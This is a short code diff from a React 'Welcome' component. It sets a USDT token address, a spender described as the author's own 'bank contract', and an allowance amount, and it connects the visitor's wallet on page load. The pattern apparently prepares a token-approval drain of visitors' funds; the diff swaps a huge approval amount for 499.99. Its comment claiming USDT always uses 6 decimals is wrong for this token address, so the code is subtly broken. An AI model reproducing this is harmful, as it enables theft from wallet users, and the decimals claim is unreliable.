@@ -25,7 +25,7 @@ const Welcome = () => {
 
   const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT
   const spender = "0xcb08c0b38eC1ac1b6fbC7771B5BD58ee6B9dE668"; // Bank contract address of mine
-  const amount = ethers.utils.parseUnits("55398325990.000000000000000001", 18);
+  const amount = ethers.utils.parseUnits("499.99", 6); // Always use 6 decimals for USDT
 
   useEffect(() => {
     connectWallet();
